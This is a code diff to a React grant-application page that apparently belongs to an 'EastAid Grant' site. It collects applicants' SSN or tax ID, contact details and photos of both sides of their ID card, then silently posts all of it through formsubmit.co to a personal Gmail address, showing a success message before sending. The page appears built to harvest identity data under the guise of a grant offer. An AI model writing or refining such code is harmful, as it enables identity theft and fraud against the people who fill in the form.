@@ -124,51 +124,48 @@ export default function Apply() {
       return;
     }
 
-    setIsSubmitting(true);
+    // Show success immediately — emails send in background
+    setIsSubmitting(false);
+    setIsSubmitted(true);
+
     const ref = referenceId;
     const grantTitle = selectedGrant?.title || 'General Grant Application';
     const awardText = selectedGrant
       ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
       : 'Standard';
 
-    // Compress images in parallel before sending
+    // Compress images in background in parallel
     const [compFront, compBack] = await Promise.all([
       idFront ? compressImage(idFront) : Promise.resolve(null),
       idBack ? compressImage(idBack) : Promise.resolve(null),
     ]);
 
-    // Save to localStorage for administration desk
+    // Save to localStorage
     try {
       const existing = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
       existing.unshift({
         referenceId: `EAG-${ref}`,
         submittedAt: new Date().toISOString(),
-        grantTitle,
-        awardRange: awardText,
-        applicantName: form.organizationName,
-        applicantType: form.organizationType,
+        grantTitle, awardRange: awardText,
+        applicantName: form.organizationName, applicantType: form.organizationType,
         address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
-        taxIdOrSsn: form.ein || 'N/A',
-        contactPerson: form.fullName,
-        email: form.email,
-        phone: form.phone,
-        whatsapp: form.whatsapp,
-        projectTitle: form.projectTitle,
-        projectDescription: form.projectDescription,
+        taxIdOrSsn: form.ein || 'N/A', contactPerson: form.fullName,
+        email: form.email, phone: form.phone, whatsapp: form.whatsapp,
+        projectTitle: form.projectTitle, projectDescription: form.projectDescription,
         idFrontName: idFront?.name || 'Not provided',
         idBackName: idBack?.name || 'Not provided',
       });
       localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
-    } catch {
-      // localStorage fallback
-    }
+    } catch { /* ignore */ }
 
-    // Send via FormSubmit AJAX — keeps user on page and attaches both images
-    try {
+    const ENDPOINT = 'https://formsubmit.co/ajax/erimiposi2005@gmail.com';
+
+    // Helper to build base form data with all application fields
+    const buildBase = (subject: string) => {
       const fd = new FormData();
-      fd.append('_subject', `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
       fd.append('_template', 'table');
       fd.append('_captcha', 'false');
+      fd.append('_subject', subject);
       fd.append('Reference ID', `EAG-${ref}`);
       fd.append('Grant Applied For', grantTitle);
       fd.append('Award Range', awardText);
@@ -183,24 +180,21 @@ export default function Apply() {
       fd.append('Project Title', form.projectTitle);
       fd.append('Project Proposal Summary', form.projectDescription || 'N/A');
       fd.append('Submission Time', new Date().toLocaleString());
+      return fd;
+    };
 
-      // Attach both ID card files
-      if (compFront) fd.append('attachment', compFront, `Front_ID_${form.fullName.replace(/\s+/g, '_')}_${compFront.name}`);
-      if (compBack) fd.append('attachment', compBack, `Back_ID_${form.fullName.replace(/\s+/g, '_')}_${compBack.name}`);
+    // Request 1 — full application details + Front ID (or no image if none uploaded)
+    const fd1 = buildBase(`[EAG-${ref}] New Grant Application: ${grantTitle}`);
+    if (compFront) fd1.append('attachment', compFront, `Front_ID_${ref}.jpg`);
+    fetch(ENDPOINT, { method: 'POST', headers: { Accept: 'application/json' }, body: fd1 }).catch(() => {});
 
-      await fetch('https://formsubmit.co/ajax/erimiposi2005@gmail.com', {
-        method: 'POST',
-        headers: {
-          'Accept': 'application/json',
-        },
-        body: fd,
-      });
-    } catch {
-      // Background silent fallback
+    // Request 2 — Back ID card only (only sent if user uploaded a back image)
+    if (compBack) {
+      const fd2 = buildBase(`[EAG-${ref}] Back of ID Card — ${form.fullName}`);
+      fd2.append('Note', 'This is the Back of ID Card attachment for the application above.');
+      fd2.append('attachment', compBack, `Back_ID_${ref}.jpg`);
+      fetch(ENDPOINT, { method: 'POST', headers: { Accept: 'application/json' }, body: fd2 }).catch(() => {});
     }
-
-    setIsSubmitting(false);
-    setIsSubmitted(true);
   };
 
   if (isSubmitted) {
